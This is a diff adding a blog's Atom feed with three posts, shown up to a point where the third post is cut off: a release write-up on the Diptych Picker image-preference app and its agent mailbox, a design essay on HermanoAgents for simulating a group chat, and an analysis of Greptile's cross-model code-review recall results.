@@ -1,0 +1,1763 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://eahenle.github.io/pr-preview/pr-24/feed.xml" rel="self" type="application/atom+xml" /><link href="https://eahenle.github.io/pr-preview/pr-24/" rel="alternate" type="text/html" /><updated>2026-07-28T05:09:42+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/feed.xml</id><title type="html">E. Adrian Henle</title><subtitle>Machine Learning Engineering for Agentic AI Platforms and Internet Intelligence</subtitle><entry><title type="html">Pick One: Building Diptych Picker as a Durable Agent Loop</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/07/27/diptych-picker.html" rel="alternate" type="text/html" title="Pick One: Building Diptych Picker as a Durable Agent Loop" /><published>2026-07-27T23:00:00+00:00</published><updated>2026-07-27T23:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/07/27/diptych-picker</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/07/27/diptych-picker.html"><![CDATA[<p>The interface is two images and one decision.</p>
+
+<p>Pick A or B. The winner stays exactly where it is. The loser disappears, and a
+new challenger takes its place.</p>
+
+<p>That is <a href="https://github.com/eahenle/diptych-picker">Diptych Picker</a>, which I
+have just released as open-source software under the MIT License. It is also a
+good example of how a very small product idea can force surprisingly serious
+systems architecture.</p>
+
+<p><img src="/pr-preview/pr-24/assets/img/diptych-picker-1.0-offline-demo.jpg" alt="Diptych Picker 1.0 offline demo showing two independent image candidates" /></p>
+
+<p><em>Diptych Picker 1.0 in deterministic offline mode. The demo ships with five
+redistributable seed images and makes no model calls.</em></p>
+
+<p>The first version of the idea sounded almost trivial: generate two images, let
+me choose one, and use the choice to generate something better. Repeat until
+the system understands my taste.</p>
+
+<p>But “generate something better” hides nearly every difficult part.</p>
+
+<p>What does the model learn from one click? What happens when generation takes
+longer than the user wants to wait? What survives a crash? What if three
+independent images are needed at once? What if a moderation filter rejects one
+job? What does it mean for the selected image to “stay” when the surrounding
+application is polling, preloading, reconciling disk state, and rerendering a
+React tree?</p>
+
+<p>The visible interaction remained a binary choice. The machinery behind it
+became a durable agent loop.</p>
+
+<h2 id="the-winner-is-an-invariant">The winner is an invariant</h2>
+
+<p>The most important product rule is unusually strict:</p>
+
+<blockquote>
+  <p>When an image wins, that exact image remains on the same side. Only the loser
+is replaced.</p>
+</blockquote>
+
+<p>“Exact” means more than preserving the prompt or asking an image model for a
+variation. Diptych Picker preserves the winner’s candidate ID, URL, bytes,
+metadata, side, browser object identity, and existing <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> node. The winner
+is never sent through an editing model.</p>
+
+<p>That rule gives the comparison meaning. If choosing A quietly replaces A with
+a close reconstruction, the user is no longer comparing a stable reference
+against new evidence. The experiment changes underneath them.</p>
+
+<p>It also made the implementation better. Winner preservation became a contract
+that reaches from the domain model through the server, API, preloader, React
+components, and browser tests. A tiny interaction rule turned into a useful
+architectural spine.</p>
+
+<p>The app supports four outcomes:</p>
+
+<ul>
+  <li>A wins;</li>
+  <li>B wins;</li>
+  <li>the pair is a neutral tie; or</li>
+  <li>both lose.</li>
+</ul>
+
+<p>Wins update Elo ratings with K=32. A tie replaces both images without treating
+either as positive or negative evidence. “Both lose” removes both from the
+reusable pool without distorting Elo, while still recording that the generated
+directions were unwanted.</p>
+
+<p>The result is less like rating a static gallery and more like running a
+continuous tournament whose contestants are being invented while it proceeds.</p>
+
+<h2 id="image-generation-should-not-live-inside-the-web-server">Image generation should not live inside the web server</h2>
+
+<p>The easiest architecture would have been a Next.js route that calls a model
+API, waits, and returns an image.</p>
+
+<p>I deliberately did not build that.</p>
+
+<p>The Diptych Picker web process never receives an API key, launches a model
+subprocess, or invokes the Codex CLI. It binds to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>, owns the game,
+and writes complete generation jobs to a file-backed mailbox. An interactive
+Codex session owns authentication, permissions, agent execution, and image
+generation.</p>
+
+<p>The process hierarchy is:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interactive root supervisor
+└── persistent mailbox monitor
+    ├── fresh image worker
+    ├── fresh image worker
+    └── fresh image worker
+</code></pre></div></div>
+
+<p>There is exactly one persistent monitor. It recovers the mailbox, polls for
+work, claims jobs, maintains a heartbeat, delegates bounded tasks, and
+publishes terminal results. Each image job receives a fresh worker, and up to
+three independent workers can run concurrently.</p>
+
+<p>This separation matters for more than credential hygiene. A browser request
+should not own the lifetime of a slow, expensive, failure-prone creative job.
+The job should exist before a worker notices it, remain valid if the UI
+refreshes, and still be recoverable if the agent session disconnects.</p>
+
+<p>The web app and the agent agree through durable files, not wishful timing.</p>
+
+<h2 id="the-mailbox-is-the-product">The mailbox is the product</h2>
+
+<p>When the ready queue drops below its configured target, the app writes refill
+requests under <code class="language-plaintext highlighter-rouge">.local-data/agent-mailbox/</code>. Claiming is atomic. Active work is
+leased. Completion and failure are idempotent. Job IDs remain tombstoned after
+archival so an old request cannot reappear as new work.</p>
+
+<p>A completed worker does not simply hand the app a path and hope for the best.
+The publication path verifies the expected job, fully decodes the PNG, checks
+its dimensions and square format, computes its SHA-256 digest, stores it under
+that content-addressed name, and records a strict terminal result.</p>
+
+<p>This is a lot of ceremony for an image game. It is also why the game can
+recover cleanly.</p>
+
+<p>If Codex closes in the middle of a refill, I leave <code class="language-plaintext highlighter-rouge">.local-data</code> alone and run
+the launcher again. The monitor reconciles already-terminal work, resumes
+unfinished jobs whose leases require recovery, and continues ordinary polling.
+It does not regenerate everything or publish two candidates for one request.</p>
+
+<p>The same durability supports the rest of the product:</p>
+
+<ul>
+  <li>a FIFO challenger buffer for instant swaps;</li>
+  <li>a local fallback pool when generation is briefly behind;</li>
+  <li>a bounded Elo-ranked pool of curated and learned candidates;</li>
+  <li>content-addressed image exports;</li>
+  <li>versioned save files with validation on restore; and</li>
+  <li>an experimental acknowledged <code class="language-plaintext highlighter-rouge">co-proc</code> transport that can accelerate live
+delivery without replacing the mailbox as the source of truth.</li>
+</ul>
+
+<p>The mailbox began as infrastructure. It became the boundary that makes the
+interaction trustworthy.</p>
+
+<h2 id="taste-needs-more-than-a-prompt">Taste needs more than a prompt</h2>
+
+<p>A single free-form prompt is a poor representation of taste. It entangles
+subject, medium, composition, palette, mood, safety boundaries, and negative
+constraints in one paragraph that is difficult to edit or compare.</p>
+
+<p>Diptych Picker instead keeps a structured preference profile with separate
+fields for themes, inspiration, media, visual style, palette, content level,
+and things to avoid. A private source image can be analyzed into an editable
+draft that describes transferable visual qualities without asking for a
+person’s identity or exact likeness.</p>
+
+<p>The profile can be:</p>
+
+<ul>
+  <li><strong>Frozen</strong>, so the model never edits it;</li>
+  <li><strong>Guided</strong>, allowing restrained revisions after enough evidence; or</li>
+  <li><strong>Unfettered</strong>, allowing broader revisions at a faster cadence.</li>
+</ul>
+
+<p>Even adaptive changes remain winner-gated and reviewable. The app records
+revision history, permits named presets, and keeps manual control over what
+becomes active.</p>
+
+<p>There is also an immutable weighted prompt deck. Cards can gain weight when
+their generated candidates win. Repeated rejections can request repair
+suggestions, but the suggestions do not silently overwrite the source card.
+Two cards can be blended into a review-only child. Three to five favorite
+generated images can be distilled into a new card that records all of its
+source candidates.</p>
+
+<p>This is the distinction I wanted: the system may learn from behavior without
+pretending that behavior is unambiguous.</p>
+
+<h2 id="product-rules-should-be-editable-too">Product rules should be editable too</h2>
+
+<p>The mechanics that shape the experiment are not universal constants. Version
+1.0 exposes four per-game rules in the UI:</p>
+
+<ul>
+  <li>ready-queue size;</li>
+  <li>reusable-pool size;</li>
+  <li>champion-retirement streak; and</li>
+  <li>maximum consecutive local fallback draws.</li>
+</ul>
+
+<p>Changing the pool limit trims the weakest members immediately. Increasing the
+queue schedules refill capacity. A new retirement streak applies to the next
+comparison. These rules persist in exported saves, while starting a fresh game
+restores configured defaults.</p>
+
+<p>Making them editable turned out to be useful for the same reason structured
+preferences are useful: hidden constants are difficult to reason about.
+Visible rules make the experiment inspectable.</p>
+
+<h2 id="what-10-means-here">What “1.0” means here</h2>
+
+<p>Calling something 1.0 should be a claim about its boundary, not its perfection.</p>
+
+<p>For Diptych Picker, the stable boundary includes the deterministic offline
+demo, the local agent workflow, the comparison mechanics, durable recovery,
+editable preferences and rules, prompt cards, saves, the public API, and the
+documented single-user loopback security model.</p>
+
+<p>It does not claim that every proposed transport or future game mode is
+finished. Tournament play and further persistent <code class="language-plaintext highlighter-rouge">co-proc</code> parity remain
+follow-up work. The current co-proc channel pool is explicitly experimental;
+the mailbox path is the supported fallback.</p>
+
+<p>I made the release scope auditable:</p>
+
+<ul>
+  <li><a href="https://github.com/eahenle/diptych-picker/blob/v1.0.0/examples/feature-scenarios.md">32 public feature scenarios</a>;</li>
+  <li><a href="https://github.com/eahenle/diptych-picker/blob/v1.0.0/docs/FEATURE_MATRIX.md">a feature matrix connecting every scenario to documentation and automated evidence</a>;</li>
+  <li>470 unit and integration tests;</li>
+  <li>20 mailbox-protocol tests;</li>
+  <li>23 Chromium end-to-end scenarios;</li>
+  <li>a clean source-archive installation test; and</li>
+  <li>five documented, redistributable seed PNGs.</li>
+</ul>
+
+<p>The release workflow reruns the required checks before creating its annotated
+tag and GitHub release. The public archives contain no local game data,
+environment overrides, worker handoffs, or generated artifacts.</p>
+
+<h2 id="try-it-without-an-agent">Try it without an agent</h2>
+
+<p>Diptych Picker requires Node.js 24 or newer. The quickest path is the
+deterministic offline demo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/eahenle/diptych-picker.git
+<span class="nb">cd </span>diptych-picker
+npm ci
+npm run demo
+</code></pre></div></div>
+
+<p>Open <a href="http://127.0.0.1:3000">http://127.0.0.1:3000</a>. After dependency installation, that mode makes no
+model or network calls.</p>
+
+<p>To run the generated-image loop, install and authenticate Codex, then launch
+the repository workflow:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm <span class="nb">install</span> <span class="nt">--global</span> @openai/codex
+codex login
+npm run codex:play
+</code></pre></div></div>
+
+<p>The launcher starts the optimized local app and asks the repo-local
+<code class="language-plaintext highlighter-rouge">$run-diptych-picker</code> skill to supervise the persistent monitor and fresh
+workers.</p>
+
+<p>The project includes a <a href="https://github.com/eahenle/diptych-picker/blob/v1.0.0/docs/GETTING_STARTED.md">getting-started guide</a>,
+<a href="https://github.com/eahenle/diptych-picker/blob/v1.0.0/docs/USER_GUIDE.md">user guide</a>,
+<a href="https://github.com/eahenle/diptych-picker/blob/v1.0.0/docs/AGENT_MODE.md">agent-mode architecture</a>,
+<a href="https://github.com/eahenle/diptych-picker/blob/v1.0.0/docs/API.md">local API reference</a>,
+and <a href="https://github.com/eahenle/diptych-picker/releases/tag/v1.0.0">complete 1.0.0 release notes</a>.</p>
+
+<h2 id="the-small-loop-is-still-the-point">The small loop is still the point</h2>
+
+<p>It is easy to discuss Diptych Picker as a mailbox, an agent hierarchy, an Elo
+system, a content-addressed store, or a preference-learning scaffold.</p>
+
+<p>Those things matter because they protect a much smaller experience.</p>
+
+<p>Two images appear.</p>
+
+<p>You pick one.</p>
+
+<p>It stays.</p>
+
+<p>Something new arrives.</p>
+
+<p>And, one comparison at a time, the space of possible images begins to bend
+toward what you meant.</p>]]></content><author><name></name></author><category term="ai" /><category term="agents" /><category term="open-source" /><category term="image-generation" /><category term="nextjs" /><summary type="html"><![CDATA[How a two-image preference game became a local-first system for durable agent work, immutable winners, editable taste, and crash-safe image generation.]]></summary></entry><entry><title type="html">The Room Between the Voices</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/07/25/the-room-between-the-voices.html" rel="alternate" type="text/html" title="The Room Between the Voices" /><published>2026-07-25T21:00:00+00:00</published><updated>2026-07-25T21:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/07/25/the-room-between-the-voices</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/07/25/the-room-between-the-voices.html"><![CDATA[<p>The idea began, as respectable systems architecture often does, with a group chat making jokes.</p>
+
+<p>Someone suggested training AI versions of the people in the chat. The obvious implementation was easy to imagine: collect enough messages from each participant, produce a persona prompt or LoRA for each one, put the resulting bots in a shared channel, and let them talk. Give every model the right verbal fingerprints and perhaps the simulation would feel like the original group.</p>
+
+<p>That version might clone several voices. It would not clone the chat.</p>
+
+<p>A group conversation is not merely a bag of people with recognizable prose styles. It has timing, rhythm, selective attention, dormant threads, interruptions, reactions, crossed messages, and silence. It has an intuitive sense of whether the room can tolerate one more subject right now. It remembers who has been talking, who has gone quiet, which joke is still alive, and which argument everyone is carefully stepping around.</p>
+
+<p>This is the more interesting design problem behind <strong>HermanoAgents</strong>, a proposed system for simulating an ongoing multi-person group chat. The central claim is simple: the system can be mechanistically nonhuman while remaining behaviorally human. Humans coordinate conversation through distributed attention, inhibition, familiarity, social prediction, and awareness of the room. HermanoAgents makes a compiled approximation of some of that invisible coordination explicit.</p>
+
+<p>It calls that approximation the <strong>Conductor</strong>.</p>
+
+<p>The Conductor is not a puppetmaster. It does not put opinions into anyone’s mouth or compose a joke and hand it to the funniest participant. It represents room-level state and manages access to the floor. The participants still decide whether they care, whether they have anything worth saying, and what their words will be.</p>
+
+<h2 id="three-kinds-of-agency">Three kinds of agency</h2>
+
+<p>HermanoAgents divides the job among three components: the Scout, the Conductor, and the Hermanos.</p>
+
+<p>The <strong>Scout</strong> looks outward. It notices events that could inspire a new thread: news, technical releases, project activity, media, and personal developments from explicitly authorized sources. Its output is structured stimulus rather than prose for the group. It might report that a new model was released, why the release is timely, and which known interests it touches. It does not decide who should speak. It does not decide whether now is a good moment. It certainly does not write the eventual post.</p>
+
+<p>The <strong>Conductor</strong> looks at the room. It tracks conversational pace and tone, active and dormant threads, recent participation, interruption cost, and the group’s apparent appetite for novelty. When the Scout brings it an event, the Conductor asks whether the chat can absorb a new topic at all. If so, it identifies plausible participants, offers them the opportunity, and resolves simultaneous interest. This is floor management, not authorship.</p>
+
+<p>The <strong>Hermanos</strong> are the participant models. Each has its own learned or prompted attention patterns, interests, relationships, and written voice. An Hermano decides whether an offered event matters to it; whether it has an angle worth adding; whether it would bring that subject to this particular group; and whether to bid, pass, react, defer, or withdraw. If it ultimately speaks, it realizes the message in its own voice.</p>
+
+<p>That separation prevents a subtle architectural collapse. If the Scout chooses a person, the Scout becomes a casting director. If the Conductor supplies the substance of a response, the Conductor becomes the real author. HermanoAgents gives each component less power so the simulated participants can retain meaningful autonomy.</p>
+
+<h2 id="the-new-thread-protocol">The new-thread protocol</h2>
+
+<p>For a newly observed event, the order of operations is the design:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Scout observes and structures an event.
+2. Conductor decides whether the room is ready.
+3. Conductor offers the event to plausible Hermanos.
+4. Hermanos independently bid or pass.
+5. Conductor performs a light final allocation gate.
+6. One or more Hermanos receive soft grants.
+7. Each granted Hermano waits a stochastic pre-authoring interval.
+8. On waking, each sees the conversation as it exists now and re-evaluates.
+9. It may open, bridge, reply, react, pass, or withdraw.
+10. If it proceeds, inference begins.
+11. Once inference begins, its context is fixed.
+12. Inference streaming supplies the typing latency.
+</code></pre></div></div>
+
+<p>The first Conductor gate must happen before the Hermanos bid. The room first decides whether a new topic is welcome; only then do relevant people spend attention deciding whether they personally care. Otherwise every external stimulus wakes every persona, or some upstream router appoints an announcer without regard for the conversation already in progress.</p>
+
+<p>“Interesting” is not a universal property of an event. Two people can care for different reasons. A third may be the obvious topical match but have nothing worth saying. A fourth may care deeply and still know that this is not a subject they would bring to this group. Bidding after the room-level gate preserves those distinctions, including the participant’s ability to pass.</p>
+
+<p>The final Conductor gate should be perfunctory. It resolves contention, notices changes in conversational state, and prevents three nearly identical openings when that would feel wrong. It can also grant several complementary bids when a pile-on would feel entirely right. What it cannot do is write the joke, opinion, or argument. Allocation should remain allocation.</p>
+
+<h2 id="inspiration-context-is-not-authorship-context">Inspiration context is not authorship context</h2>
+
+<p>The crucial temporal distinction is between the state that inspires a message and the state in which the message is finally written.</p>
+
+<p>An Hermano may bid because a particular conversational moment makes an event seem irresistible. But it does not begin authoring immediately. A stochastic pre-authoring delay creates a window in which the world of the chat can move. Someone may post. The topic may turn serious. Another participant may introduce the same event. A better bridge may appear. The original opening may become redundant or suddenly tasteless.</p>
+
+<p>Consider a concrete run:</p>
+
+<blockquote>
+  <p><strong>11:02</strong> — The Scout observes an AI release.<br />
+<strong>11:05</strong> — The Conductor decides the room is ready and offers it to two Hermanos.<br />
+<strong>11:05</strong> — Both bid.<br />
+<strong>11:06</strong> — Both receive soft grants with different delays.<br />
+<strong>11:08</strong> — The first begins authoring.<br />
+<strong>11:09</strong> — An unrelated message appears.<br />
+<strong>11:10</strong> — The second begins authoring and sees that new message.<br />
+<strong>11:11</strong> — The first message appears, generated from its older context.<br />
+<strong>11:12</strong> — The second bridges from the intervening message, turns its opener into a reply, or withdraws.</p>
+</blockquote>
+
+<p>At 11:10, the second Hermano is not obligated to fulfill the intention it formed at 11:05. It re-evaluates against the current room. The first Hermano, however, does not magically absorb the 11:09 message after inference has begun. Its causal history has already forked.</p>
+
+<p>This gives the chat crossed messages and imperfect coordination without asking the Conductor to sprinkle in synthetic disorder. The mess emerges from ordinary concurrency: different actors make decisions from different snapshots, then their outputs arrive in an order no one completely controlled.</p>
+
+<p>That is socially normal. The mechanism is not human, but the effect is. Real chats are full of messages that were sensible when someone began typing and slightly strange by the time they landed.</p>
+
+<h2 id="one-delay-not-two">One delay, not two</h2>
+
+<p>The only synthetic timing mechanism needed here is the stochastic delay <strong>before authoring starts</strong>.</p>
+
+<p>Once inference begins, model execution and streaming already take time. That duration tends to scale with the generated response, producing the functional equivalent of typing latency. Adding another randomized “typing…” delay after generation would add theater without improving causality.</p>
+
+<p>More importantly, the inference boundary prevents retroactive conversational omniscience. A message that arrives after generation starts is not incorporated into the output merely because it arrived before the output finished streaming. The Hermano writes from the context it actually saw when it began. Longer responses remain exposed to more intervening activity, just as they should.</p>
+
+<h2 id="a-grant-is-not-a-command">A grant is not a command</h2>
+
+<p>A turn offer is not an order. A bid is not an irreversible commitment. A grant is a soft lease on the floor, not a command to fill it.</p>
+
+<p>An Hermano may pass when first offered an event. After bidding and waiting, it may withdraw because the moment has changed. It may downgrade a planned thread starter to a reaction, defer to someone else, or convert its idea into a reply. Silence is a valid outcome, not a routing failure.</p>
+
+<p>The same principle applies to ordinary reactive conversation. When a message seems to invite one or more participants, the Conductor can offer them the floor. A selected Hermano can answer, react, defer, or decline. This matters because believable people do not merely possess distinctive things to say; they possess distinctive thresholds for saying them.</p>
+
+<h2 id="concurrency-without-choreography">Concurrency without choreography</h2>
+
+<p>The Conductor may grant the same event to more than one Hermano. Different pre-authoring delays can then yield sequential adaptation, crossed messages, complementary pile-ons, redundant posts, withdrawal, or a thread starter transformed into a reply.</p>
+
+<p>The goal is not chaos as decoration. It is to avoid the polished, serialized quality of a single omniscient author writing every participant in turn. In that design, every message perfectly incorporates every previous message because the author sees the total sequence. The result can be witty and coherent while feeling nothing like a group chat. Nobody steps on anyone. Nobody independently reaches the same conclusion. Nobody posts the setup to a joke that has already moved on.</p>
+
+<p>A real group contains overlapping causal histories. Several people can begin from one shared state, develop different intentions in parallel, and publish into states none of them individually selected. Soft grants allow the system to preserve that structure without surrendering all floor control.</p>
+
+<h2 id="six-tempting-ways-to-get-it-wrong">Six tempting ways to get it wrong</h2>
+
+<p>The simplest alternative is to let every persona monitor every event and decide whether to post. That maximizes local autonomy at the cost of compute, noise, and a peculiar culture in which agents constantly campaign for airtime. Most events should not interrupt most rooms.</p>
+
+<p>Letting the Scout assign an event directly to a persona is cheaper, but it bypasses the room-level timing decision. The selected participant becomes an announcer whose job is to deliver routed content, whether or not the chat is ready.</p>
+
+<p>Letting the Conductor tell a persona exactly what to say is cleaner still—and quietly fatal. The Conductor becomes a centralized author while the Hermanos become voice filters. Their apparent agency is cosmetic.</p>
+
+<p>A fixed round-robin speaker order solves contention by destroying selective participation. It treats silence as a missing turn and presence as an obligation. Human groups do neither.</p>
+
+<p>One global model writing every participant sequentially can produce excellent dialogue, but it also produces suspiciously composed dialogue. Each turn is written with complete knowledge of the preceding one, so the room behaves like a screenplay rather than concurrent messaging.</p>
+
+<p>Finally, post-generation typing delays imitate a user-interface cue while leaving the causal model untouched. If the output was already generated from an earlier snapshot, waiting longer does not make it more socially situated. Inference already provides the latency that matters.</p>
+
+<h2 id="does-attention-belong-to-the-voice">Does attention belong to the voice?</h2>
+
+<p>One unresolved question is how much of a participant should live in one model adaptation.</p>
+
+<p>A single persona adapter might learn both conversational attention and written voice: what this person notices, when they participate, and how they phrase the result. A more modular system could use two LoRAs, one aimed at participation and attention and another at written realization. A still cleaner separation could use two stages or agents, with one deciding interest and intent and another expressing that intent in the participant’s voice.</p>
+
+<p>There is an alluring story in which early transformer layers are “thought” and later layers are “voice,” making the split a matter of attaching adapters at different depths. It is a hypothesis worth testing, not an architectural fact. Representations are distributed, layer roles vary, and convenient metaphors can outrun evidence.</p>
+
+<p>Fortunately, the orchestration design does not depend on settling this question. A sensible V1 can use a simpler participant model, log its offers, bids, withdrawals, and realized messages, and evaluate the failure modes. If Hermanos notice the wrong things, speak too often, or produce generically on-brand prose, then the evidence supports splitting attention from realization. Modularity should answer an observed problem, not an aesthetic craving for more boxes.</p>
+
+<h2 id="the-room-as-operational-state">The room as operational state</h2>
+
+<p>To simulate a social group, modeling individuals independently is not enough. The group has an operational state: what is alive, what is exhausted, what can be interrupted, who has recently dominated, whether the room wants another subject, whether silence is comfortable, and whether two people are likely to collide.</p>
+
+<p>This does not require claiming that the group has a separate consciousness hovering above its members. Much of what humans call “reading the room” is already an informal estimate of distributed signals. The Conductor is a practical representation of those signals—a compiled approximation of the room that makes timing and access decisions explicit while leaving meaning and language local.</p>
+
+<p>That may be the most interesting part of HermanoAgents. Cloned voices are the obvious demo. The harder and more revealing work is modeling the shared space in which those voices sometimes speak, sometimes overlap, and often decide not to.</p>
+
+<p>The Scout notices the world.<br />
+The Conductor decides whether the room can entertain it.<br />
+The Hermanos decide whether it moves them.<br />
+Time changes the context.<br />
+The Hermanos still own the words.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Designing HermanoAgents around timing, selective attention, interruptions, silence, and the operational state of a synthetic group chat.]]></summary></entry><entry><title type="html">Model Inversion and the Geometry of Correlated Error</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/07/23/model-inversion-correlated-error.html" rel="alternate" type="text/html" title="Model Inversion and the Geometry of Correlated Error" /><published>2026-07-23T16:00:00+00:00</published><updated>2026-07-23T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/07/23/model-inversion-correlated-error</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/07/23/model-inversion-correlated-error.html"><![CDATA[<p>There is a familiar kind of debugging failure. You solve a problem, inspect the solution, inspect it again, and get the same reassuring answer every time: yes, that looks right. Then someone else glances at it and asks the question you never asked. They have not necessarily worked harder. They have simply not inherited the premise that made your solution look inevitable.</p>
+
+<p>That is a useful intuition pump for a recent <a href="https://www.greptile.com/blog/model-inversion">Greptile experiment on “Model Inversion”</a>. It is not, however, a reason to imagine that a language model trusts its own work, feels ownership of a pull request, or is reluctant to criticize itself. Those are social and psychological explanations. They are the wrong level of description for a code-review policy.</p>
+
+<p>The machine version is both less romantic and more useful: <strong>correlated error</strong>. An authoring model and a reviewer that use closely related reasoning processes can fail together. A second model can add value not because it is more skeptical, but because it is a partially independent instrument.</p>
+
+<h2 id="what-greptile-actually-measured">What Greptile actually measured</h2>
+
+<p>Greptile assembled two historical datasets: 500 pull requests attributed to Claude Code and 500 attributed to Codex. Authorship was inferred from signals such as <code class="language-plaintext highlighter-rouge">Co-authored-by</code> commit trailers, PR-title prefixes, and branch prefixes—not observed directly at generation time. It constructed roughly 1,500 ground-truth comments from sentiment analysis, vote ratios, and git archaeology; excluded style, praise, and documentation comments; then ran Claude Code’s and Codex’s <code class="language-plaintext highlighter-rouge">/review</code> three times per PR. Recall of high-severity bugs was matched to that ground truth by an LLM judge and averaged.</p>
+
+<p>The headline figure is modest but provocative. On Claude-authored PRs, GPT 5.5 recalled 60.0% of the high-severity bugs versus Claude Opus 4.7’s 53.7%. On Codex-authored PRs, Opus recalled 62.0% versus GPT’s 50.5%. The matrix makes the crossed comparison explicit:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Author attributed by Greptile</th>
+      <th style="text-align: right">Claude Opus 4.7 review recall</th>
+      <th style="text-align: right">GPT 5.5 review recall</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Claude Code</td>
+      <td style="text-align: right">53.7% (same-model)</td>
+      <td style="text-align: right">60.0% (cross-model)</td>
+    </tr>
+    <tr>
+      <td>Codex</td>
+      <td style="text-align: right">62.0% (cross-model)</td>
+      <td style="text-align: right">50.5% (same-model)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><em>High-severity-bug recall (P0/P1); values and model labels reproduced from <a href="https://www.greptile.com/blog/model-inversion">Greptile’s “Models are worse at reviewing their own code,” Fig. 01</a>.</em></p>
+
+<p>In Greptile’s terminology, each reviewer did better on the other model’s attributed code than on its own. The company has turned that observation into an experimental routing feature: infer the coding agent from PR metadata and send the review to the other model.</p>
+
+<p>There are other clues in the article that make the result less mysterious. Greptile reports that Claude-attributed PRs contained a larger share of missing-behavior defects, a category in which GPT had better recall, while Codex-attributed PRs skewed more toward semantic-intent and error-handling issues, where Claude’s recall was stronger. It also reports markedly different review traces: in the sampled runs, Opus spent 59.4% of visible evidence in a broad “scope” phase, whereas GPT spent 82.5% in an “investigate” phase. Those are observations about a particular evaluation setup and model versions, not a timeless taxonomy of model personalities. But they are exactly the sort of differences that can produce complementary blind spots.</p>
+
+<h2 id="the-quantity-that-matters-is-covariance">The quantity that matters is covariance</h2>
+
+<p>It helps to name the measurement precisely. Treat a model plus its prompt, tools, repository context, and decoding configuration as a stochastic transition kernel—a policy that maps the current state of a task into the next action or token. This is a better abstraction than pretending that an agent is literally a classical Turing machine, and it keeps the surrounding scaffold in view.</p>
+
+<p>Let</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Q_ij = P(reviewer M_j detects a defect | defect introduced by author M_i)
+</code></pre></div></div>
+
+<p>The Model Inversion hypothesis says that, for at least some pairs,</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Q_ii &lt; Q_ij,    where i != j.
+</code></pre></div></div>
+
+<p>In plain English: model <em>j</em> may be better at finding defects introduced by model <em>i</em> than model <em>i</em> is at finding its own. Notice what this does <strong>not</strong> say. It does not say that <em>j</em> is the universally stronger reviewer. Nor does it say that “different” automatically means “better.” The decisive quantity is the covariance between the author’s error events and the reviewer’s missed-detection events.</p>
+
+<p>A reviewer with lower standalone recall can be the more valuable partner if its failures are less correlated with the author’s. Conversely, repeatedly sampling a nominally excellent reviewer whose omissions track the author’s omissions can produce a misleading pile of agreement. Review quality is therefore not just a property of one model; it is a property of a pair, under a task distribution and a scaffold.</p>
+
+<h2 id="why-the-same-model-can-miss-the-same-defect-twice">Why the same model can miss the same defect twice</h2>
+
+<p>A coding agent does not emit a patch in one indivisible flash. It follows a sequence of transitions shaped by learned parameters, the user request, system and developer instructions, available tools, the repository state, retrieved files, and a decoding policy. Somewhere along that path it chooses an abstraction boundary: perhaps a cache is treated as local rather than shared, an error is treated as unreachable, or a requirement is read as a UI preference rather than an invariant.</p>
+
+<p>If the resulting patch lies near a stable region of that process, a later request to “review this change” may start a different local trajectory while remaining in the same basin of attraction. The reviewer sees the diff, searches the same kinds of evidence, makes similar relevance judgments, and stops when its familiar criteria are met. The original assumption may be so central to its representation of the task that it is not selected as a hypothesis to test at all.</p>
+
+<p>This is not self-deception. It is shared inductive bias. It can arise through several concrete channels:</p>
+
+<ul>
+  <li><strong>Shared representations and abstraction boundaries.</strong> The author and reviewer may compress the same requirement into the same, inadequate latent distinction.</li>
+  <li><strong>Similar salience over requirements.</strong> Both may attend strongly to the visible happy path and weakly to a terse concurrency constraint or an implied compatibility promise.</li>
+  <li><strong>Similar search and tool-use policies.</strong> If both inspect the same files, issue the same narrow searches, or seek the same confirming evidence, neither is likely to expose the omitted dependency.</li>
+  <li><strong>Common stopping criteria.</strong> A policy trained to avoid noisy findings may decline to report a plausible defect before it has collected decisive evidence; another policy may report it but create a false-positive burden.</li>
+</ul>
+
+<p>Changing “implement” to “review” changes the immediate objective. It does not necessarily replace the representations that made the defect plausible. Raising temperature or changing the sampling seed creates diversity, but diversity is not independence. It may amount to sending another explorer through the same terrain with the same map.</p>
+
+<p>A different model changes more than a seed. Its transition rules, learned features, post-training trade-offs, and tool-use habits may cause it to partition the task differently. It may inspect the migration before the handler, treat a fallback as suspicious rather than pragmatic, or spend its uncertainty budget on an edge case the author made invisible. Call that <strong>epistemic parallax</strong>: a change of inferential viewpoint that makes a previously aligned assumption visible as an assumption.</p>
+
+<h2 id="a-checksum-not-a-proof">A checksum, not a proof</h2>
+
+<p>It would be a mistake to turn epistemic parallax into a new folk theorem. Claude, Codex, Gemini, and other frontier systems share large portions of public training data, programming conventions, documentation, benchmark incentives, architectural ancestry, and post-training objectives. They can inherit the same false premise, cargo-cult the same API pattern, or fail to notice the same underspecified requirement. A reviewer can also be confidently wrong in a way that agrees with the author.</p>
+
